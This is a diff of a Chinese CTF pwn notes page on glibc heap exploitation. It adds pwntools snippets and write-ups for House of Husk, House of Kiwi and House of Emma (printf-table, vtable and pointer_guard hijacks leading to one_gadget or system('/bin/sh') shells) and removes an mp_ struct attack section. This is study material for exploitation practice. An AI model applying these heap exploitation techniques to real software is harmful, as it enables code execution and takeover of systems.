@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 164 分钟
+                    阅读时长: 182 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    81767 字
+                    90793 字
                 </time>
             </div>
         
@@ -924,6 +924,8 @@
 </span><span class="lnt">54
 </span><span class="lnt">55
 </span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -961,6 +963,8 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 自使用获取栈地址stack addr 0x10需自调整</span>
 </span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">()),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">((</span><span class="s1">&#39;</span><span class="se">\x55</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x56</span><span class="s1">&#39;</span><span class="p">))[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">&amp;~</span><span class="mh">0xFFF</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl"><span class="c1"># 32位</span>
 </span></span><span class="line"><span class="cl"><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
@@ -1911,7 +1915,11 @@
 </li>
 <li>glibc-2.29：ubuntu19.04</li>
 <li>glibc-2.30~31：ubuntu20.04</li>
-<li>glibc-2.34：ubuntu22.04</li>
+<li>glibc-2.34：ubuntu22.04
+<ul>
+<li>删除了malloc-hook，exit-hook等一系列hook</li>
+</ul>
+</li>
 </ul>
 <p><strong>ubuntu</strong>下查看<code>glibc</code>版本</p>
 <div class="highlight"><div class="chroma">
@@ -10180,7 +10188,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x240</span><span class="p">)</span> <span class="c1"># chunk0</span>
-</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="c1"># fd字段</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="c1"># fd字段，高版本需要target异或值</span>
 </span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x240</span><span class="p">)</span> <span class="c1"># chunk0</span>
 </span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x240</span><span class="p">)</span> <span class="c1"># 劫持tcache结构体</span>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span> <span class="c1"># 覆盖count 以及 tcache_entry, deadbeef改为target地址</span>
@@ -10685,73 +10693,6 @@
 	
 	
 ></p>
-<h4 id="mp_-struct-attack">mp_ struct attack</h4>
-<ul>
-<li>修改掉 <code>tcache_bins</code>：# 只允许的最大tcache chunk大小，释放的小于<code>mp_.tcache_bins</code>的<code>chunk</code>会被当作<code>tcache bin</code>处理，可以把很大的 <code>chunk</code> 用 <code>tcachebin</code> 管理</li>
-<li>修改掉 <code>tcache_count</code>： 可以控制链表的 <code>chunk</code> 的数量</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">tcache_bins</span> <span class="o">=</span> <span class="n">mp_</span> <span class="o">+</span> <span class="mi">80</span>
-</span></span><span class="line"><span class="cl"><span class="n">tcache_max_bytes</span> <span class="o">=</span> <span class="n">mp_</span> <span class="o">+</span> <span class="mi">88</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/img/pwn_note.zh-cn.assets/-172844676894978.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<ul>
-<li><strong>任意地址写</strong>堆地址：<code>large bin</code>链表中并没有对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行双向链表完整性的检查，通过改写<code>large bin</code>的<code>bk_nextsize</code>的值来向<strong>指定的位置+0x20</strong>的位置写入一个<strong>堆地址，即很大的值，使得下次<code>free</code>时堆块将进入<code>tcache</code>处理</strong></li>
-<li>通过uaf <code>browse</code>出<code>fd</code>的值，对堆块进行填充时fd保持不变，而更改<code>bk_nextsize</code>和<code>fd_nextsize</code>的值,覆写<code>malloc</code>中<code>tcache</code>部分的<code>mp_.tcache_bins</code>的值为一个很大的地址</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mp_addr</span> <span class="o">+</span> <span class="mh">0x50</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">41</span><span class="p">,</span> <span class="mh">0x900</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="c1"># 用于触发漏洞，当unsorted bin 遍历将其转入 large bins 更改 tcache_bins </span>
-</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="c1"># 将会使得该堆块进入tcache bin中</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>因为溢出和tcache struct内容存放在堆空间上的缘故，需要伪造的结构内容会落在我们的可控堆块上，由于0x500（9号堆块）实在太大，导致tcache bin 的链表头写到malloc顺序中的1号堆块中，可调试观察</strong></p>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844676894979.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span> <span class="c1"># 将9号块位置修改为free_hook地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span> <span class="c1"># 将拿tcache堆块，即向free_hook处创建堆块，覆盖为system地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="c1"># 10号堆块提前写入内容&#39;/bin/sh&#39; 完成getshell</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>覆写<code>free_hook</code>为<code>system</code>，进而getshell</li>
-</ul>
 <h3 id="unsorted-bin-attack">Unsorted bin attack</h3>
 <h4 id="地址泄露-2">地址泄露</h4>
 <p><strong>libc地址泄露</strong></p>
@@ -11990,6 +11931,7 @@
 <p><strong>条件</strong></p>
 <ul>
 <li>需要泄露libc基址和堆地址，同一系统多次启动 ld 和 libc 的偏移相对固定，而远程需要爆破</li>
+<li>只用一次任意地址写，large bin attack，攻击<code>rtld_global</code>结构体</li>
 </ul>
 <p><strong>原理</strong></p>
 <p>关注内容：</p>
@@ -13847,6 +13789,979 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>glibc-2.27 开始，abort 函数改动，不再调用 <code>_IO_flush_all_lockp</code> 函数，因此不能利用 malloc_printerr 实现程序执行流劫持</p>
+<h4 id="house-of-husk">House of Husk</h4>
+<ul>
+<li>利用<code>printf</code>自定义格式化字符串相关函数</li>
+<li>glibc中通过<code>__register_printf_function</code>为<code>printf</code>格式化字符串中的<code>spec</code>(%d中的d)注册对应函数</li>
+<li>维护字符与函数映射关系只通过<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>2指针访问</li>
+</ul>
+<p><strong>其中，两个表均为glibc中全局变量，各自都包含0x100项且相邻，每一个项0x8字节，类似哈希表，spec对应值偏移处放入函数或参数指针</strong></p>
+<p><strong>printf</strong></p>
+<p>两种调用：<code>__parse_one_specmb</code>中的调用及<code>printf_positional</code>中的调用</p>
+<ol>
+<li>
+<p><code>printf</code>调用 <code>__printf</code>，接着调用<code>__vfprintf_internal</code>，其中先调用<code>buffered_vfprintf</code></p>
+</li>
+<li>
+<p>返回<code>__vfprintf_internal</code>调用<code>printf_positional</code></p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">function_done</span> <span class="o">=</span> <span class="n">__printf_function_table</span><span class="p">[(</span><span class="n">size_t</span><span class="p">)</span> <span class="n">spec</span><span class="p">]</span><span class="c1">// 调用function_table中函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">specs</span><span class="p">[</span><span class="n">nspecs_done</span><span class="p">].</span><span class="n">info</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>以及在<code>printf_positional</code>中调用<code>__parse_one_specmb</code></p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">__printf_function_table</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">// 覆盖后不满足
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">||</span> <span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">spec</span> <span class="o">&gt;</span> <span class="n">UCHAR_MAX</span> <span class="c1">// 不满足
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">||</span> <span class="n">__printf_arginfo_table</span><span class="p">[</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">spec</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="c1">// 覆盖后不满足
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    		<span class="c1">// 调用info.spec中函数，后一行为参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">||</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="p">(</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">ndata_args</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">__printf_arginfo_table</span><span class="p">[</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">spec</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">data_arg_type</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">     <span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<p>在两个函数中都会调用函数，劫持<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>指针写入one_gadget获取shell</p>
+<p><strong>利用</strong></p>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250121225208401.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250121225208401"
+	
+	
+></p>
+<ul>
+<li>
+<p>unsorted bin 泄露 liibc 基址</p>
+</li>
+<li>
+<p>修改 <code>global_max_fast</code>为极大值</p>
+</li>
+<li>
+<p>可利用<code>House of Corrosion</code>将<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>值覆盖成释放堆块的内存指针，构造：</p>
+<ul>
+<li>
+<p><code>__printf_function_table</code>覆盖为非0值，通过<code>vfprintf</code>中判断使调用<code>printf_positional</code></p>
+</li>
+<li>
+<p><code>__printf_function_table</code>或<code>__printf_arginfo_table</code>相应偏移处指向写有one_gadget的内存指针</p>
+</li>
+<li>
+<p>若利用<code>__printf_function_table</code>触发需要<code>__printf_arginfo_table</code>指向内存且该内存对应spec偏移处为NULL</p>
+</li>
+</ul>
+</li>
+<li>
+<p>调用<code>printf</code>触发漏洞</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__printf_arginfo_table&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__printf_function_table&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 经过ASCII码值偏移个8字节的NULL，one_gadget</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span> <span class="c1"># 可修改4也可修改5</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1"># 释放到 fast bin 中，即利用 House of Corrosion修改两个指针为对应chunk地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 最终触发printf(&#34;%d&#34;,xx)即可</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="house-of-kiwi">House of Kiwi</h4>
+<p><strong>背景</strong></p>
+<p>调用<code>exit</code>退出可通过劫持<code>vtable</code>上<code>_IO_overflow</code>劫持：FSOP</p>
+<p>调用<code>_exit</code>退出直接系统调用不经过IO清理工作，需主动触发异常退出来调用<code>vtable</code>上相关函数</p>
+<p>调用<code>read</code>或<code>write</code>不会走IO而直接走系统调用</p>
+<p><strong>条件</strong></p>
+<ul>
+<li>
+<p>&lt;glibc-2.35，某些glibc版本<code>_IO_file_jumps</code>地址所在段可写</p>
+</li>
+<li>
+<p>利用<code>sysmalloc</code>中的<code>assert</code></p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">assert</span> <span class="p">((</span><span class="n">old_top</span> <span class="o">==</span> <span class="n">initial_top</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">old_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">      <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">old_size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">MINSIZE</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">       <span class="n">prev_inuse</span> <span class="p">(</span><span class="n">old_top</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">old_end</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>assert不满足将调用<code>__malloc_assert</code>，利用其中的<code>fflush (stderr)</code></p>
+</li>
+<li>
+<p>最终通过<code>_IO_fflush</code>中的<code>_IO_SYNC</code>，调用vtable中的<code>__sync</code>函数指针</p>
+</li>
+</ul>
+<p><code>_IO_SYNC</code>对应汇编部分内容</p>
+<p>将<code>_IO_file_jumps_</code>对应<code>_IO_new_file_sync</code>函数指针位置覆盖为one_gadget</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov rbp, qword ptr [rbx + 0xd8] ; rbp指向 __GI__IO_file_jumps_
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">call qword ptr [rbp + 0x60] ; 调用_IO_new_file_sync
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用</strong></p>
+<ul>
+<li>泄露堆地址，利用tcache相关攻击，任意地址malloc到<code>tcache_perthread_struct</code>，修改count为0x7</li>
+<li>unsorted bin leak泄露libc基址，任意地址写修改<code>_IO_file_jumps</code>为<code>one_gadget</code></li>
+<li>或修改<code>_IO_file_jumps</code>某偏移处为<code>system</code>，修改<code>_IO_2_1_stderr_</code>（实则为参数rdi值）为<code>/bin/sh</code></li>
+<li>最终破坏 top chunk 结构（size改为0），然后申请新堆块触发assert即可</li>
+</ul>
+<p><strong>ORW利用</strong></p>
+<p>若无法execve系统调用，需借助setcontext，根据rdx指向内存区域设置，调用<code>_IO_new_file_sync</code>时rdx指向<code>_IO_helper_jumps</code>结构(可写)，在该结构处伪造setcontext+offset实现ORW</p>
+<p>call的地址改为<code>&amp;(setcontext+offset)</code>，修改<code>__start___libc_IO_vtables</code>为<code>SigreturnFrame</code>，实际改的是<code>_IO_helper_jumps</code>，其中有些地址不可随意覆盖，以调试报错为准，设置 rsp 指向提前布置号的 rop 的起始位置，同时设置 rip 指向 <code>ret</code> 指令</p>
+<p><strong>glibc-2.36开始</strong><code>__malloc_assert</code>不再调IO而是直接系统调用<code>sys_writev</code>，方法失效</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_Noreturn</span> <span class="k">static</span> <span class="kt">void</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__malloc_assert</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">assertion</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                 <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">function</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__libc_message</span> <span class="p">(</span><span class="n">do_abort</span><span class="p">,</span> <span class="s">&#34;\
+</span></span></span><span class="line"><span class="cl"><span class="s">Fatal glibc error: malloc assertion failure in %s: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">function</span><span class="p">,</span> <span class="n">assertion</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__builtin_unreachable</span> <span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="house-of-emma">House of Emma</h4>
+<ul>
+<li>&lt;glibc-2.35</li>
+<li>利用<code>_IO_jump_t</code>类型的函数表<code>_IO_cookie_jumps</code>，包括<code>read,write,seek,close</code>函数，需要绕过指针保护 <code>PTR_DEMANGLE</code></li>
+<li>汇编可知：宏定义操作将函数指针循环右移11位，并与<code>fs:[0x30]</code>异或得到真正函数地址</li>
+<li><code>fs:[0x28]</code>为tls上存储的canary，根据<code>tcbhead_t</code>结构体定义<code>fs:[0x30]</code>为<code>pointer_guard</code>用于加密</li>
+</ul>
+<p>可通过gdb中命令<code>canary</code>以及<code>search -8 canary_value</code>找到tls地址</p>
+<p><strong>利用</strong></p>
+<ul>
+<li>泄露堆地址、libc基址，large bin attack 在 tls对应<code>pointer_guard</code>上写一个堆地址来绕过指针保护</li>
+<li>覆盖<code>stderr</code>为堆地址，同House of Kiwi，伪造<code>_IO_cookie_file</code>，修改vtable函数指向的指针</li>
+<li>改坏 top chunk 通过<code>__malloc_assert</code>触发漏洞，且可结合setcontext利用rop</li>
+</ul>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250122182857674.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250122182857674"
+	
+	
+></p>
+<p><strong>调用链</strong>：</p>
+<p><code>__malloc_assert</code> -&gt; <code>__fxprintf</code> -&gt; <code>__vfxprintf</code> -&gt; <code>locked_vfxprintf</code> -&gt; <code>__vfprintf_internal</code></p>
+<p><code>__vfprintf_internal</code>实际调用<code>vprintf</code>，其中<code>outstring</code>函数最终调用了<code>PUT</code>，为IO调用，调用vtable指针</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">outstring</span> <span class="p">((</span><span class="k">const</span> <span class="n">UCHAR_T</span> <span class="o">*</span><span class="p">)</span> <span class="n">format</span><span class="p">,</span> <span class="n">lead_str_end</span> <span class="o">-</span> <span class="p">(</span><span class="k">const</span> <span class="n">UCHAR_T</span> <span class="o">*</span><span class="p">)</span> <span class="n">format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="cp">#define outstring(String, Len)                          \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    do {                                                \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        const void *string_ = (String);                 \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        done = outstring_func(s, string_, (Len), done); \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        if (done &lt; 0)                                   \
+</span></span></span><span class="line"><span class="cl"><span class="cp">            goto all_done;                              \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    } while (0)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="cp"># define PUT(F, S, N)   _IO_sputn ((F), (S), (N)) 
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
